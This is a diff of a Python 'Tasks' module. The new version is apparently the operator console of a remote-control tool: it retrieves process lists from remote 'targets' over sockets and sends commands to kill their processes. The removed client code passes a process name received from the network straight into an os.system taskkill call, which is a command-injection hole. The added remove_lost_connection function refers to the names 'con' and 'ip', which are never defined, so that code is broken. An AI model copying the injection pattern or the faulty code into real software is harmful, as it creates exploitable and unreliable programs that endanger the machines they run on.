@@ -1,214 +1,178 @@
 from datetime import datetime
-from threading import Thread
-import subprocess
-import os
-import sys
+from termcolor import colored
+import ntpath
+import socket
+import shutil
+import time
 import os
 
-
-# TODO: Move all command files to result lists
 
 class Tasks:
-    def __init__(self, soc, path, hostname, localIP):
-        self.soc = soc
-        self.log_path = path
-        self.hostname = hostname
-        self.localIP = localIP
-        self.task_list = []
+    def __init__(self, con, ip, ttl, clients, connections, targets, ips, tmp_availables, root):
+        self.con = con
+        self.ip = ip
+        self.ttl = ttl
+        self.clients = clients
+        self.connections = connections
+        self.targets = targets
+        self.ips = ips
+        self.tmp_availables = tmp_availables
+        self.root = root
 
-    def get_date(self):
+    def bytes_to_number(self, b):
+        res = 0
+        for i in range(4):
+            res += b[i] << (i * 8)
+        return res
+
+    def tasks(self):
         d = datetime.now().replace(microsecond=0)
-        dt = str(d.strftime("%b %d %Y %I.%M.%S %p"))
-
-        return dt
-
-    def logIt(self, logfile=None, debug=None, msg=''):
-        dt = self.get_date()
-        if debug:
-            print(f"{dt}: {msg}")
-
-        if logfile is not None:
-            try:
-                if not os.path.exists(logfile):
-                    with open(logfile, 'w') as lf:
-                        lf.write(f"{dt}: {msg}\n")
-                        return True
-
-                else:
-                    with open(logfile, 'a') as lf:
-                        lf.write(f"{dt}: {msg}\n")
-                    return True
-
-            except FileExistsError:
-                pass
-
-    def logIt_thread(self, log_path=None, debug=False, msg=''):
-        self.logit_thread = Thread(target=self.logIt, args=(log_path, debug, msg), name="Log Thread")
-        self.logit_thread.start()
-        return
-
-    def convert_to_bytes(self, no):
-        result = bytearray()
-        result.append(no & 255)
-        for i in range(3):
-            no = no >> 8
-            result.append(no & 255)
-
-        return result
-
-    def command_to_file(self):
-        self.logIt_thread(self.log_path, msg=f'Running command_to_file()...')
+        dt = str(d.strftime("%b %d %Y | %I-%M-%S"))
+        print(f"[{colored('*', 'cyan')}]Retrieving remote station's task list\n"
+              f"[{colored('*', 'cyan')}]Please wait...")
         try:
-            self.logIt_thread(self.log_path, msg=f'Opening file: {self.taskfile}...')
-            tskinfo = open(self.taskfile, 'w')
+            self.con.send('tasks'.encode())
+            filenameRecv = self.con.recv(1024).decode()
+            time.sleep(self.ttl)
+            size = self.con.recv(4)
+            size = self.bytes_to_number(size)
+            current_size = 0
+            buffer = b""
+            filenameRecv = str(filenameRecv).strip("b'")
 
-            self.logIt_thread(self.log_path, msg=f'Writing output to {self.taskfile}...')
-            sinfo = subprocess.call(['tasklist'], stdout=tskinfo)
-            tskinfo.write("\n")
-            self.logIt_thread(self.log_path, msg=f'Closing file: {self.taskfile}...')
-            tskinfo.close()
-            self.logIt_thread(self.log_path, msg=f'File closed.')
+            # Create a directory with host's name if not already exists.
+            for item in self.tmp_availables:
+                for conKey, ipValue in self.clients.items():
+                    for ipKey in ipValue.keys():
+                        if item[1] == ipKey:
+                            ipval = item[1]
+                            host = item[2]
+                            user = item[3]
+                            path = os.path.join(self.root, host)
+                            try:
+                                os.makedirs(path)
 
-            return True
+                            except FileExistsError:
+                                pass
 
-        except (FileNotFoundError, FileExistsError) as e:
-            self.logIt_thread(self.log_path, msg=f'File Error: {e}')
-            return False
-
-    def send_file_name(self):
-        self.logIt_thread(self.log_path, msg=f'Running send_file_name()...')
-        try:
-            self.logIt_thread(self.log_path, msg=f'Sending file name: {self.taskfile}...')
-            self.soc.send(f"{self.taskfile}".encode())
-            self.logIt_thread(self.log_path, msg=f'Send Completed.')
-            return True
-
-        except (WindowsError, socket.error) as e:
-            self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
-            return False
-
-    def print_file_content(self):
-        self.logIt_thread(self.log_path, msg=f'Running print_file_content()...')
-        self.logIt_thread(self.log_path, msg=f'Opening file: {self.taskfile}...')
-        with open(self.taskfile, 'r') as file:
-            self.logIt_thread(self.log_path, msg=f'Adding content to list...')
-            for line in file.readlines():
-                self.task_list.append(line)
-
-        self.logIt_thread(self.log_path, msg=f'Printing content from list...')
-        for t in self.task_list:
-            print(t)
-
-    def send_file_size(self):
-        self.logIt_thread(self.log_path, msg=f'Running send_file_size()...')
-        self.logIt_thread(self.log_path, msg=f'Defining file size...')
-        length = os.path.getsize(self.taskfile)
-        self.logIt_thread(self.log_path, msg=f'File Size: {length}')
-
-        try:
-            self.logIt_thread(self.log_path, msg=f'Sending file size...')
-            self.soc.send(self.convert_to_bytes(length))
-            self.logIt_thread(self.log_path, msg=f'Send Completed.')
-            return True
-
-        except (WindowsError, socket.error) as e:
-            self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
-            return False
-
-    def send_file_content(self):
-        self.logIt_thread(self.log_path, msg=f'Running send_file_content()...')
-        self.logIt_thread(self.log_path, msg=f'Opening file: {self.taskfile}...')
-        with open(self.taskfile, 'rb') as tsk_file:
-            self.logIt_thread(self.log_path, msg=f'Reading content from {self.taskfile}...')
-            tsk_data = tsk_file.read(1024)
-            try:
-                self.logIt_thread(self.log_path, msg=f'Sending file content...')
-                while tsk_data:
-                    self.soc.send(tsk_data)
-                    if not tsk_data:
+            with open(filenameRecv, 'wb') as tsk_file:
+                while current_size < size:
+                    data = self.con.recv(1024)
+                    if not data:
                         break
 
-                    tsk_data = tsk_file.read(1024)
+                    if len(data) + current_size > size:
+                        data = data[:size - current_size]
 
-                self.logIt_thread(self.log_path, msg=f'Send Completed.')
+                    buffer += data
+                    current_size += len(data)
+                    tsk_file.write(data)
 
-            except (WindowsError, socket.error) as e:
-                self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
-                return False
+            with open(filenameRecv, 'r') as file:
+                data = file.read()
+                print(data)
 
-    def confirm(self):
-        self.logIt_thread(self.log_path, msg=f'Running confirm()...')
-        try:
-            self.logIt_thread(self.log_path, msg=f'Waiting for confirmation from server...')
-            msg = self.soc.recv(1024).decode()
-            self.logIt_thread(self.log_path, msg=f'Server Confirmation: {msg}')
+            name = ntpath.basename(str(filenameRecv))
+            self.con.send(f"Received file: {name}\n".encode())
+            msg = self.con.recv(1024).decode()
+            # print(f"[{colored('@', 'green')}]{msg}")
 
-            self.logIt_thread(self.log_path, msg=f'Sending confirmation...')
-            self.soc.send(f"{self.hostname} | {self.localIP}: Task List Sent.\n".encode())
-            self.logIt_thread(self.log_path, msg=f'Send Completed.')
+            # Move screenshot file to directory
+            src = os.path.abspath(filenameRecv)
+            dst = fr"{path}"
+            shutil.move(src, dst)
 
-        except (WindowsError, socket.error) as e:
-            self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
-            return False
+            return True
 
-    def kill(self):
-        try:
-            self.logIt_thread(self.log_path, msg=f'Waiting for task name...')
-            task2kill = self.soc.recv(1024).decode()
-            self.logIt_thread(self.log_path, msg=f'Task name: {task2kill}')
+        except ConnectionResetError:
+            print(f"[{colored('!', 'red')}]Client lost connection.")
+            self.remove_lost_connection()
 
-            if str(task2kill).lower()[:1] == 'q':
-                return
+    def kill_tasks(self):
+        while True:
+            try:
+                choose_task = input(f"[?]Kill a task [Y/n]? ")
 
-            self.logIt_thread(self.log_path, msg=f'Killing {task2kill}...')
-            os.system(f'taskkill /IM {task2kill} /F')
-            self.logIt_thread(self.log_path, msg=f'{task2kill} killed.')
+            except ValueError:
+                print(f"[{colored('*', 'red')}]Choose [Y] or [N].")
 
-            self.logIt_thread(self.log_path, msg=f'Sending killed confirmation to server...')
-            self.soc.send(f"Task: {task2kill} Killed.".encode())
-            self.logIt_thread(self.log_path, msg=f'Send Completed.')
+            if choose_task.lower() == 'y':
+                self.task_to_kill()
+                break
 
-        except (WindowsError, socket.error) as e:
-            self.logIt_thread(self.log_path, msg=f'Connection Error: {e}')
-            return False
+            elif choose_task.lower() == 'n':
+                try:
+                    self.con.send('n'.encode())
+                    break
 
-        return
+                except ConnectionResetError:
+                    self.remove_lost_connection()
+                    break
 
-    def runa(self):
-        output = subprocess.getoutput('tasklist')
-        self.soc.send(f"{output}\n".encode())
-        self.soc.send("END".encode())
-
-        kil = self.soc.recv(1024).decode()
-        if str(kil)[:4].lower() == "kill":
-            self.logIt_thread(self.log_path, msg=f'Calling kill()...')
-            self.kill()
-
-    def run(self):
-        self.logIt_thread(self.log_path, msg=f'Defining tasks file name...')
-        dt = self.get_date()
-        self.taskfile = rf"C:\Peach\tasks {self.hostname} {str(self.localIP)} {dt}.txt"
-        self.logIt_thread(self.log_path, msg=f'Tasks file name: {self.taskfile}')
-
-        self.logIt_thread(self.log_path, msg=f'Calling command_to_file()...')
-        self.command_to_file()
-        self.logIt_thread(self.log_path, msg=f'Calling send_file_name()...')
-        self.send_file_name()
-        self.logIt_thread(self.log_path, msg=f'Calling print_file_content()...')
-        self.print_file_content()
-        self.logIt_thread(self.log_path, msg=f'Calling send_file_size()...')
-        self.send_file_size()
-        self.logIt_thread(self.log_path, msg=f'Calling send_file_content()...')
-        self.send_file_content()
-        self.logIt_thread(self.log_path, msg=f'Calling confirm()...')
-        self.confirm()
-
-        self.logIt_thread(self.log_path, msg=f'Removing file: {self.taskfile}...')
-        os.remove(self.taskfile)
-
-        kil = self.soc.recv(1024).decode()
-        if str(kil)[:4].lower() == "kill":
-            self.logIt_thread(self.log_path, msg=f'Calling kill()...')
-            self.kill()
+            else:
+                print(f"[{colored('*', 'red')}]Choose [Y] or [N].\n")
 
         return
+
+    def task_to_kill(self):
+        while True:
+            task_to_kill = input(f"Task filename [Q Back]: ")
+            if str(task_to_kill).lower() == 'q':
+                break
+
+            if str(task_to_kill).endswith('exe'):
+                if self.confirm_kill(task_to_kill).lower() == "y":
+                    try:
+                        self.con.send('kill'.encode())
+                        self.con.send(task_to_kill.encode())
+                        msg = self.con.recv(1024).decode()
+                        print(f"[{colored('*', 'green')}]{msg}\n")
+                        break
+
+                    except socket.error:
+                        print(f"[{colored('!', 'red')}]Client lost connection.")
+                        self.remove_lost_connection()
+
+                else:
+                    self.con.send('pass'.encode())
+                    break
+
+            else:
+                print(f"[{colored('*', 'red')}]{task_to_kill} not found.")
+
+        return task_to_kill
+
+    def confirm_kill(self, task_to_kill):
+        while True:
+            confirm_kill = input(f"Are you sure you want to kill {task_to_kill} [Y/n]? ")
+            if confirm_kill.lower() == "y":
+                break
+
+            elif confirm_kill.lower() == "n":
+                break
+
+            else:
+                print(f"[{colored('*', 'red')}]Choose [Y] or [N].")
+
+        return confirm_kill
+
+    def remove_lost_connection(self):
+        try:
+            for conKey, ipValue in self.clients.items():
+                if conKey == con:
+                    for ipKey, identValue in ipValue.items():
+                        if ipKey == ip:
+                            for identKey, userValue in identValue.items():
+                                self.targets.remove(con)
+                                self.ips.remove(ip)
+
+                                del self.connections[con]
+                                del self.clients[con]
+                                print(f"[{colored('*', 'red')}]{colored(f'{ip}', 'yellow')} | "
+                                      f"{colored(f'{identKey}', 'yellow')} | "
+                                      f"{colored(f'{userValue}', 'yellow')} "
+                                      f"Removed from Availables list.\n")
+            return False
+
+        except RuntimeError:
+            return False
